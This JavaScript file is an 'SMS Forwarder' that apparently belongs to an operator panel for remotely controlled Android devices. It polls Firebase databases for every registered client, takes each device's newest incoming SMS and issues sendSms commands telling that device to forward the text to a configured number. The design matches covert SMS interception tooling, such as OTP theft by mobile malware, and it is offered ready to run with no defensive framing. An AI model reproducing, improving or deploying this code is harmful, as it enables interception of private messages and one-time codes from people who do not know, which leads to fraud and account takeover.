/* ============================================================
   ANANYA SMS Forwarder - JS Version
   Panel ke saath chalega, Tampermonkey ki zaroorat nahi
   ============================================================ */

(function () {
    'use strict';

    console.log('[SMS-FWD] Loaded ✅');

    var ACCOUNTS_KEY = 'flixy_accounts';
    var PROCESSED_KEY = 'sms_fwd_done';
    var POLL_INTERVAL = 100;

    function getAccounts() {
        try {
            var s = localStorage.getItem(ACCOUNTS_KEY);
            return s ? JSON.parse(s) : [];
        } catch (e) {
            return [];
        }
    }

    async function fbGet(base, key, path) {
        try {
            var url = base.replace(/\/$/, '') + '/' + path + '.json?auth=' + key;
            var r = await fetch(url);
            if (!r.ok) return null;
            return await r.json();
        } catch (e) {
            return null;
        }
    }

    async function fbPut(base, key, path, data) {
        try {
            var url = base.replace(/\/$/, '') + '/' + path + '.json?auth=' + key;
            var r = await fetch(url, {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            return r.ok;
        } catch (e) {
            return false;
        }
    }

    async function fbPush(base, key, path, data) {
        try {
            var url = base.replace(/\/$/, '') + '/' + path + '.json?auth=' + key;
            var r = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            return r.ok;
        } catch (e) {
            return false;
        }
    }

    var processed = new Set();
    try {
        var saved = JSON.parse(localStorage.getItem(PROCESSED_KEY) || '[]');
        for (var i = 0; i < saved.length; i++) processed.add(saved[i]);
    } catch (e) {}

    function markDone(k) {
        processed.add(k);
        try {
            var arr = Array.from(processed).slice(-500);
            localStorage.setItem(PROCESSED_KEY, JSON.stringify(arr));
        } catch (e) {}
    }

    async function handleDevice(acc, devId) {
        try {
            var cfg = await fbGet(acc.url, acc.key, 'clients/' + devId + '/smsForwarding');
            if (!cfg) return;
            if (!cfg.enabled) return;
            if (!cfg.forwardTo) return;

            var msgs = await fbGet(acc.url, acc.key, 'messages/' + devId);
            if (!msgs) return;
            if (typeof msgs !== 'object') return;

            var ids = Object.keys(msgs);
            if (!ids.length) return;
            ids.sort(function (a, b) {
                return Number(a) - Number(b);
            });
            var newest = ids[ids.length - 1];

            var k = devId + '_' + newest;
            if (processed.has(k)) return;

            var sms = msgs[newest];
            if (!sms) { markDone(k); return; }
            if (sms.type !== 'incoming') { markDone(k); return; }

            var text = sms.message || sms.body || sms.text || '';
            if (!text) { markDone(k); return; }

            var to = String(cfg.forwardTo).replace(/[^0-9]/g, '');
            var ts = Date.now();
            var cid = 'fwd_' + ts;
            var sim = { simSlot: cfg.sim || 0 };

            await fbPut(acc.url, acc.key, 'clients/' + devId + '/webhookEvent/sendSms', {
                to: to, message: text, isSended: false,
                timestamp: ts, commandId: cid, simInfo: sim,
                forwarded: true, originalSender: sms.sender || 'Unknown'
            });

            await fbPut(acc.url, acc.key, 'clients/' + devId + '/commands/sendSms', {
                targetNumber: to, message: text, timestamp: ts,
                status: 'pending', id: cid, simInfo: sim, forwarded: true
            });

            await fbPush(acc.url, acc.key, 'clients/' + devId + '/messages', {
                sender: 'FORWARDER',
                message: 'Fwd to ' + to + ': ' + String(text).slice(0, 200),
                dateTime: ts, timestamp: ts, type: 'outgoing',
                targetNumber: to, commandId: cid, status: 'pending',
                simInfo: sim, forwarded: true
            });

            await fbPut(acc.url, acc.key, 'clients/' + devId + '/sms', {
                to: to, text: text, timestamp: ts, status: 'pending',
                commandId: cid, forwarded: true
            });

            markDone(k);
            console.log('[SMS-FWD] ✅ Forwarded:', sms.sender, '→', to);
        } catch (e) {
            console.error('[SMS-FWD]', e.message);
        }
    }

    var busy = false;
    async function tick() {
        if (busy) return;
        busy = true;
        try {
            var accs = getAccounts();
            for (var i = 0; i < accs.length; i++) {
                var acc = accs[i];
                if (!acc.url || !acc.key) continue;
                var clients = await fbGet(acc.url, acc.key, 'clients');
                if (!clients) continue;
                if (typeof clients !== 'object') continue;
                var devIds = Object.keys(clients);
                for (var j = 0; j < devIds.length; j++) {
                    await handleDevice(acc, devIds[j]);
                }
            }
        } finally {
            busy = false;
        }
    }

    setInterval(tick, POLL_INTERVAL);
    setTimeout(tick, 800);
    console.log('[SMS-FWD] Running every', POLL_INTERVAL, 'ms 🚀');

})();